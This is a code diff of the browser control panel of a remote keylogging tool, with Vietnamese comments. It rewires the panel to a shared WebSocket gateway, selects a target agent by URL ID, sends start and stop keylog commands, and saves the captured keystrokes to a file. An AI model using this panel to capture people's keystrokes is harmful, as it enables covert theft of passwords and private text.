@@ -3,60 +3,115 @@
  * Nhiệm vụ: Xử lý logic cho trang Keylogger, visual hiệu ứng phím và lưu file.
  */
 
-// Lưu ý: Đường dẫn import dựa trên giả định file nằm trong assets/js 
-// và các module nằm trong thư mục modules/ ở root. 
-// Nếu cấu trúc khác, hãy điều chỉnh đường dẫn này (ví dụ: ../../gateway.js).
-import { CONFIG } from '../../modules/config.js';
-import { Gateway } from '../../modules/gateway.js';
-
 class KeyloggerUI {
     constructor() {
         // State
         this.isLogging = false;
         this.logBuffer = ""; // Biến lưu toàn bộ nội dung keylog
-        this.serverIP = '10.148.31.96'; // IP mặc định hoặc lấy từ localStorage nếu có
+        this.originalOnKeylog = null; // Lưu callback gốc từ main.js
 
         // DOM Elements
-        this.displayInput = document.querySelector('.key-display');
-        this.btnMenu = document.querySelector('.action-buttons button:nth-child(1)');
-        this.btnStart = document.querySelector('.action-buttons button:nth-child(2)');
-        this.btnStop = document.querySelector('.action-buttons button:nth-child(3)');
-        this.btnSave = document.querySelector('.action-buttons button:nth-child(4)');
+        this.displayInput = document.getElementById('keylog-panel');
+        this.btnMenu = document.querySelector('.btn-menu');
+        this.btnStart = document.querySelector('.btn-start');
+        this.btnStop = document.querySelector('.btn-stop');
+        this.btnSave = document.querySelector('.btn-save');
         this.keys = document.querySelectorAll('.key');
-
-        // Init Gateway
-        this.gateway = new Gateway({
-            onConnected: () => this.logSystem("Connected to Gateway."),
-            onDisconnected: () => this.logSystem("Disconnected."),
-            onKeylog: (data, sender) => this.handleIncomingKey(data, sender),
-            onError: (err) => console.error(err)
-        });
 
         this.init();
     }
 
     init() {
-        // 1. Kết nối Gateway ngay khi load trang
-        this.gateway.connect(this.serverIP);
+        // Đợi window.gateway được khởi tạo từ main.js
+        const waitForGateway = () => {
+            if (!window.gateway) {
+                setTimeout(waitForGateway, 100);
+                return;
+            }
 
-        // 2. Gán sự kiện cho các nút
-        this.btnStart.onclick = () => this.startKeylog();
-        this.btnStop.onclick = () => this.stopKeylog();
-        this.btnSave.onclick = () => this.saveToDevice();
+            // Lưu callback gốc từ main.js và wrap nó với handler của chúng ta
+            this.originalOnKeylog = window.gateway.callbacks?.onKeylog;
+            
+            // Override onKeylog callback để xử lý visual effects
+            // Vẫn gọi callback gốc để main.js có thể update display
+            window.gateway.callbacks.onKeylog = (data, senderId) => {
+                // Gọi handler gốc để update display (từ main.js)
+                if (this.originalOnKeylog) {
+                    this.originalOnKeylog(data, senderId);
+                }
+                // Xử lý visual effects và buffer riêng của keylog.js
+                this.handleIncomingKey(data, senderId);
+            };
 
-        // 3. Inject CSS để phục vụ việc "nháy đèn" phím khi nhận tín hiệu
-        // (Làm thế này để không phải sửa file css gốc)
-        this.injectActiveStyle();
-        
-        this.logSystem("Ready. Press 'Start keylog' to begin.");
+            // 2. Gán sự kiện cho các nút
+            if (this.btnMenu) {
+                this.btnMenu.onclick = () => {
+                    window.location.href = './Feature_menu.html';
+                };
+            }
+            if (this.btnStart) {
+                this.btnStart.onclick = () => this.startKeylog();
+            }
+            if (this.btnStop) {
+                this.btnStop.onclick = () => this.stopKeylog();
+            }
+            if (this.btnSave) {
+                this.btnSave.onclick = () => this.saveToDevice();
+            }
+
+            // 3. Inject CSS để phục vụ việc "nháy đèn" phím khi nhận tín hiệu
+            this.injectActiveStyle();
+            
+            // 4. Đọc agent ID từ URL và tự động setTarget (nếu có)
+            this.setTargetFromURL();
+            
+            this.logSystem("Ready. Press 'Start keylog' to begin.");
+        };
+
+        waitForGateway();
+    }
+
+    setTargetFromURL() {
+        // Đọc agent ID từ URL và tự động setTarget
+        const urlParams = new URLSearchParams(window.location.search);
+        const agentId = urlParams.get('id');
+        if (agentId && window.gateway) {
+            // Đợi gateway sẵn sàng và agents list được load
+            const checkAndSetTarget = () => {
+                if (window.gateway && window.gateway.isAuthenticated) {
+                    // Đợi agents list được load trước
+                    if (window.gateway.agentsList && window.gateway.agentsList.length > 0) {
+                        window.gateway.setTarget(agentId);
+                        this.logSystem(`Đã setTarget đến agent: ${agentId}`);
+                    } else {
+                        // Nếu agents list chưa có, đợi thêm
+                        setTimeout(checkAndSetTarget, 500);
+                    }
+                } else {
+                    // Nếu gateway chưa sẵn sàng, đợi thêm
+                    setTimeout(checkAndSetTarget, 500);
+                }
+            };
+            checkAndSetTarget();
+        }
     }
 
     // --- Command Functions ---
 
     startKeylog() {
-        if (!this.gateway.isAuthenticated) {
-            // Tự động Auth nếu chưa đăng nhập (dùng hash mặc định trong config)
-            this.gateway.authenticate();
+        if (!window.gateway || !window.gateway.ws || window.gateway.ws.readyState !== WebSocket.OPEN) {
+            alert("Chưa kết nối Gateway! Vui lòng đợi kết nối...");
+            return;
+        }
+
+        if (!window.gateway.isAuthenticated) {
+            // Tự động Auth nếu chưa đăng nhập
+            window.gateway.authenticate();
+            // Đợi một chút để auth hoàn tất
+            setTimeout(() => {
+                this.startKeylog();
+            }, 500);
+            return;
         }
 
         this.isLogging = true;
@@ -64,20 +119,26 @@ class KeyloggerUI {
         
         // Gửi lệnh Start Keylog tới Server/Agent
         // interval: 0.1 để nhận dữ liệu gần như realtime cho hiệu ứng mượt
-        this.gateway.send(CONFIG.CMD.START_KEYLOG, JSON.stringify({ interval: 0.1 }));
+        window.gateway.send(window.CONFIG.CMD.START_KEYLOG, JSON.stringify({ interval: 0.1 }));
         
-        this.btnStart.style.backgroundColor = "#22c55e"; // Green signals active
-        this.btnStart.innerText = "Monitoring...";
+        if (this.btnStart) {
+            this.btnStart.style.backgroundColor = "#22c55e"; // Green signals active
+            this.btnStart.innerText = "Monitoring...";
+        }
     }
 
     stopKeylog() {
+        if (!window.gateway) return;
+
         this.isLogging = false;
         this.logSystem(">>> Keylogger STOPPED.");
         
-        this.gateway.send(CONFIG.CMD.STOP_KEYLOG, "");
+        window.gateway.send(window.CONFIG.CMD.STOP_KEYLOG, "");
         
-        this.btnStart.style.backgroundColor = ""; // Reset color
-        this.btnStart.innerText = "Start keylog";
+        if (this.btnStart) {
+            this.btnStart.style.backgroundColor = ""; // Reset color
+            this.btnStart.innerText = "Start keylog";
+        }
     }
 
     // --- Core Logic: Xử lý dữ liệu nhận về ---
@@ -105,6 +166,8 @@ class KeyloggerUI {
     }
 
     updateDisplay(char) {
+        if (!this.displayInput) return;
+
         // Giả lập hành vi nhập liệu cơ bản
         if (char === '\b' || char === 'Backspace') {
             this.displayInput.value = this.displayInput.value.slice(0, -1);
@@ -184,8 +247,9 @@ class KeyloggerUI {
 
         // ✅ CLEAR LOG SAU KHI SAVE
         this.logBuffer = "";
-        this.displayInput.value = "";
-        this.mockIndex = 0;
+        if (this.displayInput) {
+            this.displayInput.value = "";
+        }
 
         this.logSystem(">>> Log saved & cleared.");
     }
